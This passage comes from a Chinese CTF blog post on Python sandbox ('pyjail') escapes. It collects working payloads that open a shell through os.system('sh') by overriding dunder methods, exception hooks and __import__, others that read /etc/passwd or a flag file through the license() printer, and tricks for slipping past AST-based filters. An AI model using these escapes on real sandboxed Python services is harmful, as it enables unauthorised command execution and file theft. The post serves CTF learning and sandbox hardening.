<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Metaclass(type):</span><br><span class="line">    __getitem__ = exec </span><br><span class="line"></span><br><span class="line">class Sub(metaclass=Metaclass):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">Sub[&#x27;import os; os.system(&quot;sh&quot;)&#x27;]</span><br></pre></td></tr></table></figure>

<p>除了 __getitem__之外其他方法的利用方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__sub__ (k - &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__mul__ (k * &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__floordiv__ (k // &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__truediv__ (k / &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__mod__ (k % &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__pow__ (k**&#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__lt__ (k &lt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__le__ (k &lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__eq__ (k == &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ne__ (k != &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ge__ (k &gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__gt__ (k &gt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__iadd__ (k += &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__isub__ (k -= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__imul__ (k *= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ifloordiv__ (k //= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__idiv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__itruediv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;) # (Note that this only works when from __future__ import division is in effect.)</span><br><span class="line">__imod__ (k %= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ipow__ (k **= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ilshift__ (k&lt;&lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__irshift__ (k &gt;&gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__iand__ (k = &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ior__ (k |= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br><span class="line">__ixor__ (k ^= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Metaclass(type):</span><br><span class="line">    __sub__ = exec</span><br><span class="line"></span><br><span class="line">class Sub(metaclass=Metaclass):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">Sub-&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>exceptions<br>如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class RCE(Exception):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self += &#x27;import os; os.system(&quot;sh&quot;)&#x27;</span><br><span class="line">    __iadd__ = exec </span><br><span class="line"></span><br><span class="line">raise RCE</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class X:</span><br><span class="line">    def __init__(self, a, b, c):</span><br><span class="line">        self += &quot;os.system(&#x27;sh&#x27;)&quot;</span><br><span class="line">    __iadd__ = exec</span><br><span class="line">sys.excepthook = X</span><br><span class="line">1/0</span><br></pre></td></tr></table></figure>

<p>Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 __import__</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class X():</span><br><span class="line">  def __init__(self, a, b, c, d, e):</span><br><span class="line">    self += &quot;print(open(&#x27;flag&#x27;).read())&quot;</span><br><span class="line">  __iadd__ = eval</span><br><span class="line">__builtins__.__import__ = X</span><br><span class="line">&#123;&#125;[1337]</span><br></pre></td></tr></table></figure>

<p>license<br>读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]</span><br><span class="line">a = __builtins__.help</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]</span><br><span class="line">a.__class__.__exit__ = lambda self, *args: None</span><br><span class="line">with (a as b):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>当调用 license()时会打印这个文件</p>
<p>将 help 类的 __enter__方法覆盖为 license方法, 而 with 语句在创建上下文时会调用 help 的__enter__, 从而执行 license方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MyContext:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]</span><br><span class="line">a.__class__.__exit__ = lambda self, *args: None</span><br><span class="line">with (a as b):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<h3 id="ast-Attribute"><a href="#ast-Attribute" class="headerlink" title="ast.Attribute"></a>ast.Attribute</h3><p>绕过ast.Attribute获取属性</p>
<p>python 3.10 中引入了一个新的特性：match&#x2F;case，类似其他语言中的 switch&#x2F;case，但 match&#x2F;case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">item = 2</span><br><span class="line"></span><br><span class="line">match item:</span><br><span class="line">    case 1:</span><br><span class="line">        print(&quot;One&quot;)</span><br><span class="line">    case 2:</span><br><span class="line">        print(&quot;Two&quot;)</span><br><span class="line"></span><br><span class="line"># Two</span><br><span class="line"></span><br><span class="line">item = (1, 2)</span><br><span class="line"></span><br><span class="line">match item:</span><br><span class="line">    case (x, y, z):</span><br><span class="line">        print(f&quot;&#123;x&#125; &#123;y&#125; &#123;z&#125;&quot;)</span><br><span class="line">    case (x, y):</span><br><span class="line">        print(f&quot;&#123;x&#125; &#123;y&#125;&quot;)</span><br><span class="line">    case (x,):</span><br><span class="line">        print(f&quot;&#123;x&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class AClass:</span><br><span class="line">    def __init__(self, value):</span><br><span class="line">        self.thing = value</span><br><span class="line"></span><br><span class="line">item = AClass(32)</span><br><span class="line"></span><br><span class="line">match item:</span><br><span class="line">    case AClass(thing=x):</span><br><span class="line">        print(f&quot;Got &#123;x = &#125;!&quot;)</span><br><span class="line"></span><br><span class="line"># Got x = 32!</span><br></pre></td></tr></table></figure>

<p>可以绕过点号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">match str():</span><br><span class="line">    case str(__class__=x):</span><br><span class="line">        print(x==&#x27;&#x27;.__class__)</span><br><span class="line"></span><br><span class="line"># True</span><br></pre></td></tr></table></figure>

<p>‘’.__class__.__base__.__subclasses__()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match str():</span><br><span class="line">    case object(__class__=clazz):</span><br><span class="line">        match clazz:</span><br><span class="line">            case object(__base__=bass):</span><br><span class="line">                match bass:</span><br><span class="line">                    case object(__subclasses__=subclazz):</span><br><span class="line">                        print(subclazz)</span><br></pre></td></tr></table></figure>

<h3 id="ast-Assign"><a href="#ast-Assign" class="headerlink" title="ast.Assign"></a>ast.Assign</h3><p>绕过ast.Assign赋值，可以使用海象表达式<br>海象表达式解析后是ast.NamedExpr</p>
<h3 id="ast-Constant"><a href="#ast-Constant" class="headerlink" title="ast.Constant"></a>ast.Constant</h3><p>限制了数字、字符串<br>和字符串关键词绕过一样用list+dict</p>
<h3 id="ast-Subscript"><a href="#ast-Subscript" class="headerlink" title="ast.Subscript"></a>ast.Subscript</h3><p>限制索引<br>min 函数可以获取列表中最小的元素，当列表中只有一个元素时，可以直接取值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">min(list(dict(system=[])))            # system</span><br><span class="line">min(list(dict(_wrap_close=[])))       # _wrap_close</span><br><span class="line">min(list(dict(bash=[])))              # bash</span><br></pre></td></tr></table></figure>

<p>如果要获取字典元素，可以利用 get 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match globals:</span><br><span class="line">    case object(get=get_func):</span><br><span class="line">        get_func(&quot;system&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="ast-For"><a href="#ast-For" class="headerlink" title="ast.For"></a>ast.For</h3><p>限制循环<br>filter、iter、next</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def filter_func(subclazzes_item):</span><br><span class="line">    [ _wrap_close:=min(list(dict(_wrap_close=[])))]</span><br><span class="line">    match subclazzes_item:</span><br><span class="line">        case object(_＿name_＿=name):</span><br><span class="line">            if name==_wrap_close:</span><br><span class="line">                return subclazzes_item</span><br><span class="line">[</span><br><span class="line">    subclazzes_item:=min(filter(filter_func,subclazzes()))</span><br><span class="line">]</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/04/06/pyjail/">https://sakuraraindrop.github.io/2025/04/06/pyjail/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pyjail/">pyjail</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related  no-desc" href="/2025/04/07/pyjail%20problems/" title="pyjail problems"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">pyjail problems</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/07/13/20250713%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250713随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-13</div><div class="info-item-2">20250713随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/08/20250708%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250708随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">20250708随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250711随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-11</div><div class="info-item-2">20250711随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/08/pyjail%E5%8E%9F%E7%90%86/" title="pyjail原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-08</div><div class="info-item-2">pyjail原理</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/07/pyjail%20problems/" title="pyjail problems"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-07</div><div class="info-item-2">pyjail problems</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">103</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI"><span class="toc-number">1.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E7%BB%A7%E6%89%BF%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">Python继承链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">继承链流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96object%E7%B1%BB"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">获取object类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%90%E7%B1%BB%E5%88%97%E8%A1%A8"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">获取子类列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%85%B6%E5%BC%95%E7%94%A8-builtins"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">查看其引用__builtins__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.1.1.6.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">1.1.1.7.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.1.8.</span> <span class="toc-text">内存马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">jinja2过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">过滤关键词</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">过滤[]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">过滤.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">过滤_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.1.2.8.</span> <span class="toc-text">过滤大括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-3"><span class="toc-number">1.1.2.9.</span> <span class="toc-text">过滤()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97"><span class="toc-number">1.1.2.10.</span> <span class="toc-text">过滤数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.2.11.</span> <span class="toc-text">对象层面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.12.</span> <span class="toc-text">长度绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.2.13.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.2.14.</span> <span class="toc-text">回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">1.1.2.15.</span> <span class="toc-text">盲注</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E7%9B%AE%E6%A0%87"><span class="toc-number">2.1.</span> <span class="toc-text">逃逸目标</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">读写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">枚举目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.4.</span> <span class="toc-text">获取函数信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.5.</span> <span class="toc-text">修改函数信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.6.</span> <span class="toc-text">获取环境信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.7.</span> <span class="toc-text">获取全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%86%85%E9%83%A8%E5%87%BD%E6%95%B0%E6%88%96%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.8.</span> <span class="toc-text">获取模块内部函数或变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%A8%A1%E5%9D%97%E5%86%85%E9%83%A8%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.8.1.</span> <span class="toc-text">获取指定模块内部变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-main-%E4%B8%AD%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.8.2.</span> <span class="toc-text">获取 __main__ 中变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F-%E6%A8%A1%E5%9D%97-%E5%87%BD%E6%95%B0%E7%AD%89"><span class="toc-number">2.1.8.3.</span> <span class="toc-text">获取命名空间中的变量&#x2F;模块&#x2F;函数等</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">删除文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="toc-number">2.3.</span> <span class="toc-text">删除模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reload"><span class="toc-number">2.3.1.</span> <span class="toc-text">reload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-modules"><span class="toc-number">2.3.2.</span> <span class="toc-text">sys.modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-number">2.3.3.</span> <span class="toc-text">globals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE"><span class="toc-number">2.3.4.</span> <span class="toc-text">继承链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="toc-number">2.3.5.</span> <span class="toc-text">利用生成器栈帧逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">生成器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">2.3.5.2.</span> <span class="toc-text">简单的例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.3.5.3.</span> <span class="toc-text">生成器表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">2.3.5.4.</span> <span class="toc-text">生成器的属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7"><span class="toc-number">2.3.5.5.</span> <span class="toc-text">栈帧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">2.3.5.6.</span> <span class="toc-text">利用栈帧沙箱逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%B0%E6%83%91"><span class="toc-number">2.3.5.7.</span> <span class="toc-text">困惑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 